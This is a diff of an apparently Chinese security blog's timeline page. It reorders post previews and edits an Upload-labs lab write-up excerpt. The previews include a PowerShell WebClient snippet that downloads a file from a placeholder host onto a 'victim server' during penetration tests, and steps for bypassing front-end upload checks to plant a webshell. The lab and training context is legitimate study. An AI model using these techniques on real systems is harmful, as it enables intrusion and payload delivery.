@@ -336,13 +336,12 @@ exploit-db的详情：https://www.exploit-db.com/exploits/39574/
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
+                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
                                         <p>
-                                            本文转载自原文：13种方式下载文件
-渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。
-0x01 Powershell创建如下PSH脚本：
-$p = New-Object System.Net.WebClient
-$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%...
+                                            补丁下载各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到Microsoft的官网去查看和下载：https://docs.microsoft.com/zh-cn/security-updates/
+点击左边栏的Security Bulletins可以查找想要看的漏洞
+
+这里以打MS16-032（CVE-2016-0099）的补丁为例：左边栏找到MS16-032，找到系统...
                                         </p>
                                     </div>
                                 </li>
@@ -354,12 +353,13 @@ $p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%...
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
+                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
                                         <p>
-                                            补丁下载各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到Microsoft的官网去查看和下载：https://docs.microsoft.com/zh-cn/security-updates/
-点击左边栏的Security Bulletins可以查找想要看的漏洞
-
-这里以打MS16-032（CVE-2016-0099）的补丁为例：左边栏找到MS16-032，找到系统...
+                                            本文转载自原文：13种方式下载文件
+渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。
+0x01 Powershell创建如下PSH脚本：
+$p = New-Object System.Net.WebClient
+$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%...
                                         </p>
                                     </div>
                                 </li>
@@ -419,15 +419,12 @@ WordPress框架当中的Activity monitor插件引起的漏洞
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/09/20/Upload-labs Write Up/">Upload-labs Write Up</a>
                                         <p>
-                                            Less-1本关介绍两种解题方法：
-方法一
-直接上传webshell.php时，发现前端弹出警告。按F12查看，在javascript的白名单中添加php这个后缀，然后就可以直接上传成功
-
-方法二
-先将webshell的后缀改为png（或者白名单中任意后缀），然后上传，Burpsuit将数据包进行修改，重新将文件后缀改为.php，绕过前端验证就可以
-
-核心代码
-function checkF...
+                                            Less-1核心代码
+function checkFile() {
+    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
+    if (file == null || file == &quot;&quot;) {
+        alert(&quot;请选择要上传的文件!&quot;);
+ ...
                                         </p>
                                     </div>
                                 </li>
